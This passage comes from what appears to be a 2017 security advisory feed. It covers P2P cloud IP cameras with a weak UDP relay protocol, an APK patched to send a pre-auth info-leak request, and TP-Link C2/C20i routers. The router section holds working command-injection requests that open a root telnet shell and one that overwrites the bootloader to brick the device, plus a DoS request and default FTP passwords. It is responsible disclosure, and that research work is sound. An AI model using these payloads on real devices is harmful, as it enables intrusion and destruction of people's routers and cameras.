<pre><code>12:09:21.410947 IP 192.168.1.107.46958 &gt; 8.8.8.8.53: 60806+ A? openapi.xg.qq.com.gateway. (43)
12:09:26.429697 IP 192.168.1.107.58156 &gt; 202.96.134.33.53: 60806+ A? openapi.xg.qq.com.gateway. (43)
12:09:31.450033 IP 192.168.1.107.41499 &gt; 8.8.8.8.53: 28561+ A? www.baidu.com. (31)
12:09:35.128919 IP 192.168.1.107.13179 &gt; 121.42.208.86.32100: UDP, length 48
12:09:35.128932 IP 192.168.1.107.13179 &gt; 54.221.213.97.32100: UDP, length 48
12:09:35.128933 IP 192.168.1.107.13179 &gt; 120.24.37.48.32100: UDP, length 48
12:09:36.468849 IP 192.168.1.107.44185 &gt; 202.96.134.33.53: 28561+ A? www.baidu.com. (31)
12:09:41.488223 IP 192.168.1.107.41499 &gt; 8.8.8.8.53: 28561+ A? www.baidu.com. (31)
12:09:46.507810 IP 192.168.1.107.44185 &gt; 202.96.134.33.53: 28561+ A? www.baidu.com. (31)
12:09:51.527501 IP 192.168.1.107.47793 &gt; 8.8.8.8.53: 33930+ A? www.baidu.com.gateway. (39)
12:09:56.546854 IP 192.168.1.107.53618 &gt; 202.96.134.33.53: 33930+ A? www.baidu.com.gateway. (39)
12:10:01.566316 IP 192.168.1.107.47793 &gt; 8.8.8.8.53: 33930+ A? www.baidu.com.gateway. (39)
12:10:06.575735 ARP, Request who-has 192.168.1.1 tell 192.168.1.107, length 46
12:10:06.575750 ARP, Reply 192.168.1.1 is-at 00:e0:4c:51:55:ed, length 28
12:10:06.585841 IP 192.168.1.107.53618 &gt; 202.96.134.33.53: 33930+ A? www.baidu.com.gateway. (39)
12:10:11.606030 IP 192.168.1.107.46252 &gt; 8.8.8.8.53: 41046+ A? time.nist.gov. (31)
12:10:16.625044 IP 192.168.1.107.44109 &gt; 202.96.134.33.53: 41046+ A? time.nist.gov. (31)
12:10:19.214687 IP 192.168.1.107.13179 &gt; 121.42.208.86.32100: UDP, length 48
12:10:19.214700 IP 192.168.1.107.13179 &gt; 54.221.213.97.32100: UDP, length 48
12:10:19.214702 IP 192.168.1.107.13179 &gt; 120.24.37.48.32100: UDP, length 48
12:10:21.644397 IP 192.168.1.107.46252 &gt; 8.8.8.8.53: 41046+ A? time.nist.gov. (31)
</code></pre>
<p>The camera tries to resolve <code>www.baidu.com</code>, <code>openapi.xg.qq.com</code>, contacts hardcoded IPs and hosts:</p>
<ul>
<li><code>121.42.208.86:32100/udp</code> (CN: Alibaba),</li>
<li><code>54.221.213.97:32100/udp</code> (AWS US),</li>
<li><code>120.24.37.48:32100/udp</code> (CN: Alibaba),</li>
<li><code>www.baidu.com:80/tcp</code> (CN: Baidu).</li>
</ul>
<p>It appears this is the 'Cloud' functionality, enabled by default. The security of this functionality is not proven.</p>
<p>The provided Android application to manage my camera is <a href="https://play.google.com/store/apps/details?id=object.p2pwificam.client">object.p2pwificam.client.apk</a>.</p>
<p><img src="images/2017-cam-p2pwificam-0.png">
<img src="images/2017-cam-p2pwificam-1.png"></p>
<p>Netcam 360 works too:</p>
<p><img src="images/2017-cam-netcam.png"></p>
<p>It appears, the network protocol is very weak:</p>
<ol>
<li>the camera contacts a remote server using UDP,</li>
<li>the application contacts a remote server using UDP,</li>
<li>the application sends a request to the remote server, asking if the camera with the specific serial-number is online,</li>
<li>the server will reply by "camera doesn't exit", "camera is offline" or "camera is online",</li>
<li>if the camera is online, a UDP tunnel is automaticaly established between the application and the camera, using the Cloud server as a relay.</li>
</ol>
<h3>UDP tunnel:</h3>
<pre><code>[Android Application] &lt;===UDP===&gt; Cloud server &lt;===UDP===&gt; [Camera]
</code></pre>
<p>Then, the UDP tunnel is used by the application to reach the camera:</p>
<p>1/ the client will send a HTTP request to the camera with the credentials (still in clear-text)</p>
<pre><code>GET check_user.cgi?&amp;loginuse=admin&amp;loginpas=admin&amp;user=admin&amp;pwd=admin&amp;
</code></pre>
<p>or </p>
<pre><code>GET /check_user.cgi?&amp;loginuse=admin&amp;loginpas=admin&amp;user=admin&amp;pwd=admin&amp;
</code></pre>
<p>2/ the camera will reply by using HTTP over UDP whenever the credentials are valid or invalid.</p>
<p>If the credentials are valid, the camera will reply:</p>
<pre><code>result= 0;
</code></pre>
<p>If the credentials are not valid, the camera will reply:</p>
<pre><code>result=-1
</code></pre>
<p>3/ if the credentials are valid, then the application will send HTTP requests to .cgi files hosted by the camera by appending credentials to the requests (<code>?loginuse=valid_user&amp;loginpas=valid_pass</code>)</p>
<h3>Step 2 in detail:</h3>
<p>If the authentication is OK, so it is alright to dump all the configuration in cleartext!</p>
<p><img alt="" src="images/2017-cam-cloud-auth-ok.png" /></p>
<p>Note: this trace was done with one of the application listed below, to be sure applications are sharing the same "cloud" network  (it appears the daemon running on the camera doesn't strictly respect the HTTP protocol - note the lack of <code>/</code> - but it works !).</p>
<p>If the authentication is not OK. The cameras answers:</p>
<pre><code>result=-1;
</code></pre>
<p>Due to the absence of checking, an attacker can simply bruteforce credentials.</p>
<p><img alt="" src="images/2017-cam-cloud-auth-fail.png" /></p>
<h3>Step 3 in detail:</h3>
<p>The application sends:</p>
<pre><code>GET get_params.cgi?&amp;loginuse=admin&amp;loginpas=admin&amp;user=admin&amp;pwd=admin&amp;
</code></pre>
<p>OR</p>
<pre><code>GET /get_params.cgi?&amp;loginuse=admin&amp;loginpas=admin&amp;user=admin&amp;pwd=admin&amp;
</code></pre>
<p>The camera replies by sending all its configuration in clear-text:</p>
<pre><code>var now=1122211111;
var dst_enable=0;
var dst_time=0;
var tz=0;
var ntp_enable=1;
var ntp_svr="time.nist.gov";
var dhcpen=1;
var ip="192.168.2.76";
var mask="255.255.255.0";
var gateway="192.168.2.1";
var dns1="8.8.8.8";
var dns2="192.168.2.1";
var port=80;
var nashost="";
var nasport=0;
var dev2_host="";
var dev2_alias="";
var dev2_user="";
var dev2_pwd="";
var dev2_port=0;
var dev3_host="";
var dev3_alias="";
var dev3_user="";
var dev3_pwd="";
var dev3_port=0;
var dev4_host="";
var dev4_alias="";
var dev4_user="";
var dev4_pwd="";
var dev4_port=0;
var dev5_host="";
var dev5_alias="";
var dev5_user="";
var dev5_pwd="";
var dev5_port=0;
var dev6_host="";
var dev6_alias
[...]
var user1_name="";
var user1_pwd="";
var user2_name="wut";
var user2_pwd="wut";
var user3_name="admin";
var user3_pwd="admin";
[...]
</code></pre>
<p>This is interesting because an attacker can reach a camera only by knowing a serial number. The UDP tunnel between the attacker and the camera is established even if the attacker doesn't know the credentials. It's useful to note the tunnel bypasses NAT and firewall, allowing the attacker to reach internal cameras (if they are connected to the Internet) and to bruteforce credentials.
Then, the attacker can just try to bruteforce credentials of the camera:</p>
<pre><code>GET /get_params.cgi?&amp;loginuse=admin&amp;loginpas=TEST&amp;user=admin&amp;pwd=TEST&amp;
</code></pre>
<p>This protocol appears to be common to a lot of Android applications, ie:</p>
<ul>
<li><a href="https://play.google.com/store/apps/details?id=object.p2pwificam.client">object.p2pwificam.client</a>  (500.000 - 1.000.000 installations)</li>
<li><a href="https://play.google.com/store/apps/details?id=hsl.p2pipcam">hsl.p2pipcam</a> (100.000 - 500.000 installations)</li>
<li><a href="https://play.google.com/store/apps/details?id=object.liouzx.client">object.liouzx.client</a>  (100.000 - 500.000 installations)</li>
<li><a href="https://play.google.com/store/apps/details?id=object.lioupp.client">object.lioupp.client</a> (100.000 - 500.000 installations)</li>
<li><a href="https://play.google.com/store/apps/details?id=com.g_zhang.myp2pcam">com.g_zhang.myp2pcam</a> (100.000 - 500.000 installations)</li>
<li><a href="https://play.google.com/store/apps/details?id=object.aisaidezx.client">object.aisaidezx.client</a> (50.000 - 100.000 installations)</li>
<li><a href="https://play.google.com/store/apps/details?id=hsl.cam360">hsl.cam360</a>  (10.000 - 50.000 installations)</li>
<li><a href="https://play.google.com/store/apps/details?id=bravocam.p2pipcam">bravocam.p2pipcam</a> (10.000 - 50.000 installations)</li>
<li><a href="https://play.google.com/store/apps/details?id=xcam.p2pipcam">xcam.p2pipcam</a> (10.000 - 50.000 installations)</li>
<li><a href="https://play.google.com/store/apps/details?id=snugcam.p2pipcam">snugcam.p2pipcam</a> (10.000 - 50.000 installations)</li>
<li><a href="https://play.google.com/store/apps/details?id=myview.p2pipcam">myview.p2pipcam</a> (5.000 - 10.000 installations) </li>
<li><a href="https://play.google.com/store/apps/details?id=object.weimaisizx.client">object.weimaisizx.client</a> (10.000 - 50.000 installations)</li>
<li><a href="https://play.google.com/store/apps/details?id=com.tutk.P2PCamLive.Pixord">com.tutk.P2PCamLive.Pixord</a> (10.000 - 50.000 installations)</li>
<li><a href="https://play.google.com/store/apps/details?id=object.p2pnetwork.client">object.p2pnetwork.client</a> (5.000 - 10.000 installations)</li>
</ul>
<p>This list is very far from being complete.</p>
<p>So, I modified the original Android Application in order to try the pre-auth Info-Leak vulnerability:</p>
<pre><code>k% ls -la
total 14912
drwx------ 2 nobody nogroup     100 Mar  7 08:27 .
drwxrwxrwt 3 root   root        140 Mar  7 08:25 ..
-rwx------ 1 nobody nogroup    2319 Mar  7 08:25 apktool
-rwx------ 1 nobody nogroup 8488199 Mar  7 08:25 apktool.jar
-rwx------ 1 nobody nogroup 6773051 Mar  7 08:25 object.p2pwificam.client.apk
k% ./apktool d object.p2pwificam.client.apk
I: Using Apktool 2.2.2 on object.p2pwificam.client.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
S: WARNING: Could not write to $HOME (/nonexistent), using /tmp instead...
S: Please be aware this is a volatile directory and frameworks could go missing, please utilize --frame-path if the default storage directory is unavailable
I: Loading resource table from file: /tmp/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
k%
</code></pre>
<p>I edit the library which manages all the custom HTTP requests.</p>
<p>One of the interesting string is <code>GET /%sloginuse=%s&amp;loginpas=%s&amp;user=%s&amp;pwd=%s</code>:</p>
<pre><code>k% xxd ./object.p2pwificam.client/lib/armeabi/libobject_jni.so

0001f650: 3d3d 3d3d 3d3d 3d3d 0000 0000 4745 5420  ========....GET 
0001f660: 2f25 736c 6f67 696e 7573 653d 2573 266c  /%sloginuse=%s&amp;l
0001f670: 6f67 696e 7061 733d 2573 2675 7365 723d  oginpas=%s&amp;user=
0001f680: 2573 2670 7764 3d25 7326 0000 4449 443a  %s&amp;pwd=%s&amp;..DID:
0001f690: 2025 732c 2063 6769 5f67 6574 5f63 6f6d   %s, cgi_get_com
0001f6a0: 6d6f 6e3a 2025 7300 5050 5050 5f43 6f6e  mon: %s.PPPP_Con
0001f6b0: 6e65 6374 2062 6567 696e 2e2e 2e25 7300  nect begin...%s.
0001f6c0: 5050 5050 5f43 6f6e 6e65 6374 2066 6169  PPPP_Connect fai
0001f6d0: 6c65 642e 2e20 2573 2072 6574 7572 6e3a  led.. %s return:
0001f6e0: 2025 6400 5265 436f 6e6e 6563 7443 6f75   %d.ReConnectCou
0001f6f0: 6e74 3a20 2564 0a00 5050 5050 5f43 6f6e  nt: %d..PPPP_Con
0001f700: 6e65 6374 2073 7563 6365 7373 2e2e 2e6d  nect success...m
0001f710: 5f68 5365 7373 696f 6e48 616e 646c 653a  _hSessionHandle:
</code></pre>
<p>After the modification:</p>
<pre><code>0001f650: 3d3d 3d3d 3d3d 3d3d 0000 0000 4745 5420  ========....GET 
0001f660: 2f73 7973 7465 6d2e 696e 693f 6c6f 6769  /system.ini?logi
0001f670: 6e75 7365 266c 6f67 696e 7061 7373 2678  nuse&amp;loginpass&amp;x
0001f680: 7878 7878 7878 7878 7826 0000 4449 443a  xxxxxxxxx&amp;..DID:
0001f690: 2025 732c 2063 6769 5f67 6574 5f63 6f6d   %s, cgi_get_com
0001f6a0: 6d6f 6e3a 2025 7300 5050 5050 5f43 6f6e  mon: %s.PPPP_Con
0001f6b0: 6e65 6374 2062 6567 696e 2e2e 2e25 7300  nect begin...%s.
0001f6c0: 5050 5050 5f43 6f6e 6e65 6374 2066 6169  PPPP_Connect fai
</code></pre>
<p>Then, let's repack and sign the .apk:</p>
<pre><code>k% ./apktool b object.p2pwificam.client
I: Using Apktool 2.2.2
I: Checking whether sources has changed...
I: Checking whether resources has changed...
I: Building resources...
S: WARNING: Could not write to $HOME (/nonexistent), using /tmp instead...
S: Please be aware this is a volatile directory and frameworks could go missing, please utilize --frame-path if the default storage directory is unavailable
W: warning: string 'conectar' has no default translation.
W: warning: string 'str_ipcamfour' has no default translation.
W: warning: string 'user_pwd_no_show' has no default translation.
I: Copying libs... (/lib)
I: Building apk file...
I: Copying unknown files/dir...
k% openssl genrsa -out key.pem

Generating RSA private key, 2048 bit long modulus
..........................................+++
...................................................................+++
unable to write 'random state'
e is 65537 (0x010001)
k% openssl req -new -key key.pem -out request.pem
[...]
k% openssl x509 -req -days 9999 -in request.pem -signkey key.pem -out certificate.pem
Signature ok
subject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd
Getting Private key
unable to write 'random state'
k% openssl pkcs8 -topk8 -outform DER -in key.pem -inform PEM -out key.pk8 -nocrypt
k% signapk certificate.pem key.pk8 object.p2pwificam.client/dist/object.p2pwificam.client.apk signed-object.p2pwificam.client.apk
k% ls  -latr
total 21560
drwxrwxrwt 3 root   root        140 Mar  7 08:25 ..
-rwx------ 1 nobody nogroup 8488199 Mar  7 08:25 apktool.jar
-rwx------ 1 nobody nogroup    2319 Mar  7 08:25 apktool
-rwx------ 1 nobody nogroup 6773051 Mar  7 08:25 object.p2pwificam.client.apk
drwx------ 9 nobody nogroup     220 Mar  7 08:33 object.p2pwificam.client
-rw------- 1 nobody nogroup    1675 Mar  7 08:33 key.pem
-rw------- 1 nobody nogroup     956 Mar  7 08:33 request.pem
-rw------- 1 nobody nogroup    1111 Mar  7 08:33 certificate.pem
-rw------- 1 nobody nogroup    1217 Mar  7 08:33 key.pk8
drwx------ 3 nobody nogroup     220 Mar  7 08:34 .
-rw------- 1 nobody nogroup 6787146 Mar  7 08:34 signed-object.p2pwificam.client.apk
</code></pre>
<p><code>signed-object.p2pwificam.client.apk</code> is ready to be used.</p>
<p>When using it, we see that:</p>
<p>The client indeed sends the <code>system.ini</code> request within the UDP tunnel:</p>
<p><img alt="" src="images/2017-cam-system-android.png" /></p>
<p><br><br><br><br>
The camera indeed receives this request within the UDP tunnel:</p>
<p><img alt="" src="images/2017-cam-system-camera.png" /></p>
<p><br><br><br><br>
Complete trace is:</p>
<p><img alt="" src="images/2017-cam-system-yolo.png" /></p>
<p>It appears the pre-auth is not easily reachable within the cloud network.</p>
<p>This "cloud" protocol seems to be more a botnet protocol than a legit remote access protocol and has indeed weakness (everything in clear-text, i.e. an attacker can attack cameras within the cloud and leverage potential access to hack internal networks).</p>
<p>A lot of P2P ('Cloud') cameras are in fact using the same botnet protocols and the same infrastructure seemingly to be managed by a single entity.</p>
<p>Writing a PoC which bruteforces credentials of the remote camera is left as an exercise for the reader.</p>
<p><strong>Update (Mar 10, 2017):</strong> <a href="https://twitter.com/zh4ck">@zh4ck</a> <a href="https://www.slideshare.net/bz98/iot-security-is-a-nightmare-but-what-is-the-real-risk">analyzed the cloud protocol</a>.</p>
<h2>Vendor Response</h2>
<p>Due to difficulties in finding and contacting all the vendors, full-disclosure is applied.</p>
<p><strong>I advise to IMMEDIATELY DISCONNECT cameras to the Internet. Hundreds of thousands cameras are affected by the 0day Info-Leak. Millions of them are using the insecure Cloud network.</strong></p>
<h2>Report Timeline</h2>
<ul>
<li>Feb 26, 2017: Vulnerabilities found by Pierre Kim.</li>
<li>Mar 08, 2017: A public advisory is sent to security mailing lists.</li>
<li>Mar 08, 2017: Following exchanges with Embedthis Software, it appears <strong>the vulnerabilities are not located inside GoAhead but from custom and proprietary development by the Chinese OEM vendor</strong>.</li>
<li>Mar 08, 2017: The advisory is updated.</li>
<li>Apr 25, 2017: MITRE provides CVE-2017-8221, CVE-2017-8222, CVE-2017-8223, CVE-2017-8224, CVE-2017-8225.</li>
</ul>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/advisories/2017-goahead-camera-0x00.txt">https://pierrekim.github.io/advisories/2017-goahead-camera-0x00.txt</a></p>
<p><a href="https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html">https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html</a></p>
<h2>Misc</h2>
<ul>
<li>Mar 09, 2017: <a href="https://blogs.securiteam.com/index.php/archives/3043">SSD disclosed a new pre-authentification infoleak vulnerability affecting the cameras</a>.</li>
<li>Mar 09, 2017: <a href="https://s3-us-west-1.amazonaws.com/cybereasonbucket/wp-content/uploads/2017/03/08194911/PeekabooIOwnYou.pdf">Cybereason disclosed a new pre-authentification infoleak vulnerability affecting the cameras</a>.</li>
</ul>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>TP-Link C2 and C20i vulnerable to command injection (authenticated root RCE), DoS, improper firewall rules</title>
        <link href="2017-02-09-tplink-c2-and-c20i-vulnerable.html"/>
        <content type="html"><h2>Product Description</h2>
<p>TP-Link is a Chinese manufacturer of computer networking products such as routers and IOT devices.</p>
<h2>Vulnerabilities Summary</h2>
<p>Command Injections exist in the HTTP management interface up to the latest firmware version (0.9.1 4.2 v0032.0 Build 160706 Rel.37961n) of TP-Link C2 and C20i, allowing an authenticated attacker to get a remote shell with root privileges.</p>
<p>An attacker can DoS the httpd server and the firewall rules are too permissive by default on the WAN interface.</p>
<h2>Details - CVE-2017-8220 - RCE with a single HTTP request</h2>
<p>Using the so-called "Diagnostic" page, the attacker can run any command including telnetd, using the remote host field of the ping utility:</p>
<pre><code>$(echo 127.0.0.1; /usr/sbin/telnetd -l bin/sh -p 25)
</code></pre>
<p>While being authenticated (see the credentials in base64 format), sending this HTTP request directly will start a telnetd on the router on port 25/tcp without authentication:</p>
<pre><code>POST /cgi?2 HTTP/1.1
Host: 192.168.1.1
Content-Type: text/plain
Referer: http://192.168.1.1/mainFrame.htm
Content-Length: 208
Cookie: Authorization=Basic YWRtaW46YWRtaW4=
Connection: close


[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6
dataBlockSize=64
timeout=1
numberOfRepetitions=1
host=$(echo 127.0.0.1; /usr/sbin/telnetd -l bin/sh -p 25)
X_TP_ConnName=ewan_ipoe_d
diagnosticsState=Requested
</code></pre>
<p>An attacker can also use backsticks to execute commands:</p>
<pre><code>`echo 127.0.0.1; /usr/sbin/telnetd -l bin/sh -p 25`
</code></pre>
<p>Resulting access:</p>
<pre><code>user@kali:~/tplink-0day-c2-and-c20i$ telnet 192.168.1.1 25
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.
~ # ls
web      usr      sbin     mnt      lib      dev
var      sys      proc     linuxrc  etc      bin
~ # cat /proc/version 
Linux version 2.6.36 (root@localhost.localdomain) (gcc version 4.6.3 (Buildroot 2012.11.1) ) #1 Wed Jul 6 10:01:06 HKT 2016
~ # ls -la
drwxr-xr-x    9       176 web
drwxr-xr-x   13         0 var
drwxr-xr-x    4        38 usr
drwxr-xr-x   11         0 sys
drwxr-xr-x    2       193 sbin
dr-xr-xr-x   83         0 proc
drwxr-xr-x    2         3 mnt
lrwxrwxrwx    1        11 linuxrc -&gt; bin/busybox
drwxr-xr-x    3       786 lib
drwxr-xr-x    5       776 etc
drwxr-xr-x    5      1274 dev
drwxr-xr-x    2       280 bin
drwxr-xr-x   13       177 ..
drwxr-xr-x   13       177 .
~ # cd etc
/etc # ls
vsftpd_passwd              init.d                     SingleSKU_5G_RU.dat
vsftpd.conf                group                      SingleSKU_5G_NZ.dat
ushare.conf                fstab                      SingleSKU_5G_MY.dat
services                   default_config.xml         SingleSKU_5G_KR.dat
samba                      TZ                         SingleSKU_5G_FCC.dat
resolv.conf                SingleSKU_RU.dat           SingleSKU_5G_CE.dat
reduced_data_model.xml     SingleSKU_NZ.dat           SingleSKU_5G_CA.dat
ppp                        SingleSKU_MY.dat           RT2860AP5G.dat
passwd.bak                 SingleSKU_KR.dat           RT2860AP.dat
passwd                     SingleSKU_FCC.dat          MT7620_AP_2T2R-4L_V15.BIN
iptables-stop              SingleSKU_CE.dat           MT7610E-V10-FEM-1ANT.bin
inittab                    SingleSKU_5G_VN.dat
/etc # cd ..
~ # ls -la
drwxr-xr-x    9       176 web
drwxr-xr-x   13         0 var
drwxr-xr-x    4        38 usr
drwxr-xr-x   11         0 sys
drwxr-xr-x    2       193 sbin
dr-xr-xr-x   83         0 proc
drwxr-xr-x    2         3 mnt
lrwxrwxrwx    1        11 linuxrc -&gt; bin/busybox
drwxr-xr-x    3       786 lib
drwxr-xr-x    5       776 etc
drwxr-xr-x    5      1274 dev
drwxr-xr-x    2       280 bin
drwxr-xr-x   13       177 ..
drwxr-xr-x   13       177 .
~ # ps
  PID USER       VSZ STAT COMMAND
    1 admin     1060 S    init
    2 admin        0 SW   [kthreadd]
    3 admin        0 SW   [ksoftirqd/0]
    4 admin        0 SW   [kworker/0:0]
    5 admin        0 SW   [kworker/u:0]
    6 admin        0 SW&lt;  [khelper]
    7 admin        0 SW   [kworker/u:1]
   44 admin        0 SW   [sync_supers]
   46 admin        0 SW   [bdi-default]
   48 admin        0 SW&lt;  [kblockd]
   80 admin        0 SW   [kswapd0]
   82 admin        0 SW&lt;  [crypto]
  130 admin        0 SW   [mtdblock0]
  135 admin        0 SW   [mtdblock1]
  140 admin        0 SW   [mtdblock2]
  145 admin        0 SW   [mtdblock3]
  150 admin        0 SW   [mtdblock4]
  155 admin        0 SW   [mtdblock5]
  160 admin        0 SW   [mtdblock6]
  172 admin        0 SW   [kworker/0:1]
  214 admin        0 SW   [khubd]
  245 admin     1060 S    telnetd
  251 admin     2932 S    cos
  252 admin     1060 S    init
  255 admin     2120 S    igmpd
  258 admin     2144 S    mldProxy
  345 admin     2932 S    cos
  346 admin     2932 S    cos
  347 admin     2932 S    cos
  366 admin     2088 S    ntpc
  371 admin     2096 S    dyndns /var/tmp/dconf/dyndns.conf
  374 admin     2096 S    noipdns /var/tmp/dconf/noipdns.conf
  377 admin     2096 S    cmxdns /var/tmp/dconf/cmxdns.conf
  433 admin        0 SW   [RtmpCmdQTask]
  434 admin        0 SW   [RtmpWscTask]
  445 admin     1244 S    wlNetlinkTool
  449 admin     1080 S    wscd -i ra0 -m 1 -w /var/tmp/wsc_upnp/
  465 admin     1244 S    wlNetlinkTool
  466 admin     1244 S    wlNetlinkTool
  489 admin        0 SW   [RtmpCmdQTask]
  490 admin        0 SW   [RtmpWscTask]
  503 admin     1064 S    wscd_5G -i rai0 -m 1 -w /var/tmp/wsc_upnp_5G/
  506 admin     2668 S    httpd
  518 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
  521 admin     2084 S    dnsProxy
  526 admin     1068 S    dhcpd /var/tmp/dconf/udhcpd.conf
  551 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
  552 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
  553 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
  554 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
  555 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
  556 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
  557 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
  558 admin     2668 S    tmpd
  561 admin     2556 S    tdpd
  569 admin      988 S    dhcpc
  578 admin     1036 S    zebra -d -f /var/tmp/dconf/zebra.conf
  594 admin     2088 S    diagTool
  625 admin     1136 S    dropbear -p 22 -r /var/tmp/dropbear/dropbear_rsa_hos
  642 admin     2468 S    ushare
  658 admin     2468 S    ushare
  660 admin     2468 S    ushare
  661 admin     2468 S    ushare
  662 admin     2468 S    ushare
  663 admin     2468 S    ushare
  664 admin     2468 S    ushare
  666 admin     2468 S    ushare
  851 admin     1060 S    /usr/sbin/telnetd -l /bin/sh -p 25
  853 admin     1072 S    /bin/sh
  876 admin     1068 S    /bin/sh
  878 admin     2576 S    cli
  887 admin     1060 R    ps
~ #
</code></pre>
<p>With this RCE, an attacker will be able to dump and modify the configuration by editing <code>/dev/mtd3</code>.
The configuration is written in XML format and is located in the beginning (starting at offset <code>0x10</code>) of this MTD (64K).</p>
<p>If the attacker sends this string, the router will be unable to boot and will be bricked, by writing random characters on top of the u-boot partition:</p>
<pre><code>POST /cgi?2 HTTP/1.1
Host: 192.168.1.1
Content-Type: text/plain
Referer: http://192.168.1.1/mainFrame.htm
Content-Length: 208
Cookie: Authorization=Basic YWRtaW46YWRtaW4=
Connection: close


[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6
dataBlockSize=64
timeout=1
numberOfRepetitions=1
host=$(echo 127.0.0.1; cat /dev/random &gt; /dev/mtd0)
X_TP_ConnName=ewan_ipoe_d
diagnosticsState=Requested
</code></pre>
<h2>Details - CVE-2017-8219 - DoSing the HTTP server</h2>
<p>While being authenticated (see the credentials in base64 format), sending this HTTP request directly will crash the remote HTTP server:</p>
<pre><code>GET /cgi/ansi HTTP/1.1
Host: 192.168.1.1
Content-Type: text/plain
Referer: http://192.168.1.1/mainFrame.htm
Content-Length: 208
Cookie: Authorization=Basic YWRtaW46YWRtaW4=
Connection: close
</code></pre>
<p>A resulting core file will be written in the router inside the /var partition of the attacked router:</p>
<pre><code>/var # ls -la /var/
drwxrwxrwx    2         0 lock
drwxrwxrwx    2         0 log
drwxrwxrwx    2         0 run
drwxrwxrwx    7         0 tmp
drwxr-xr-x    3         0 Wireless
drwxrwxrwx    2         0 usbdisk
drwxrwxrwx    2         0 dev
drwxr-xr-x    5         0 samba
-rw-r--r--    1       132 passwd
drwxrwxrwx    2         0 3G
drwxrwxrwx    2         0 l2tp
rwxrwxrwx    7         0 vsftp
-rw-------    1    348160 core-httpd-506-11-1482798208
drwxr-xr-x   13       177 ..
drwxr-xr-x   13         0 .
/var #
</code></pre>
<h2>Details - CVE-2017-8217 - Permissive Iptables rules</h2>
<p>The default iptables rules are generated within <code>/lib/libcmm.so</code> by writing commands inside <code>/var/tmp/dconf/rc.router</code> and using <code>system()</code> on this file.</p>
<p><code>/var/tmp/dconf/rc.router</code>:</p>
<pre><code>#!/bin/sh
[...]
iptables -t nat -A POSTROUTING -j NATLOOPBACK_UPNP_SECCONN
iptables -t nat -A POSTROUTING -j POSTROUTING_NATLOOPBACK_DMZ
iptables -t nat -A PREROUTING -j PREROUTING_DMZ
iptables -t filter -A FORWARD -i br+ -j ACCEPT
iptables -t filter -A FORWARD -d 224.0.0.0/4 -j ACCEPT
[...]
</code></pre>
<p>By default, the SNMP port is open on every interface:</p>
<pre><code>iptables -A INPUT -p udp --dport 161 -j ACCEPT
</code></pre>
<p>This can be verified with iptables on the router:</p>
<pre><code>/proc # iptables -nL
Chain INPUT (policy DROP)
[...]
ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0            udp dpt:161
[...]
</code></pre>
<p>You can check too by reading the file <code>/var/tmp/dconf/rc.router</code>.</p>
<p>Luckily, even if SNMP configuration can be modified using the hidden <code>/main/snmp.html</code> webpage,
it appears the snmpd has been removed from the firmware image.</p>
<h2>Details - CVE-2017-8218 - Misc</h2>
<p>The binaries (<code>/usr/bin/cos</code>, <code>/usr/bin/tmpd</code>, <code>/lib/libcmm.so</code>) are overall badly designed programs, executing tons of <code>system()</code> and running as root.</p>
<p><code>/usr/bin/cos</code> is a daemon running as root and is launched at the end of <code>/etc/init.d/rcS</code> (<code>cos &amp;</code>): it starts all the daemons using system (httpd ntpc dnsProxy dhcpd dhcpc snmpd upnpd diagTool voip_server voip_client pjsua cwmp wlNetlinkTool pppd dyndns igmpd zebra ushare smbd vsftpd telnetd, noipdns hostapd ipsecVpn radvd mldProxy racoon wscd...)</p>
<p><code>/usr/bin/tmpd</code> is a daemon running as root and listens to <code>127.0.0.1:20002</code>.</p>
<p><code>/lib/libcmm.so</code> is a library with all the main system functions (system reinitialisation [admin:$1$$iC.dUsGpxNNJGeOm1dFio/:0:0:root:/:/bin/sh], wifi configuration, debugging with TFTP[hi dutserver!], VPN configuration, <code>ifconfig interfaces</code>, <code>insmod /lib/modules/pptp.ko</code>, ...)</p>
<p>Vsftpd contains default weak passwords:</p>
<pre><code>user@kali:~$ cat ./etc/vsftpd_passwd
admin:1234:1:1;guest:guest:0:0;test:test:1:1;$
user@kali:~$
</code></pre>
<p>Access:</p>
<pre><code>admin:1234
guest:guest
test:test
</code></pre>
<h2>Vendor Response</h2>
<p>T-P-Link plans to release a new firmware in February 2017, patching
all listed vulnerabilities. T-P-Link wants to draw attention that in
order to exploit two over three security vulnerabilities, an attacker
would need to have valid credentials.</p>
<h2>Report Timeline</h2>
<ul>
<li>Sep 17, 2016: Vulnerabilities found by Pierre Kim.</li>
<li>Dec 26, 2016: TP-Link support is contacted by livechat. TP-Link replies there is no process to handle security problems in TP-Link routers and refuses to indicate a security point of contact.</li>
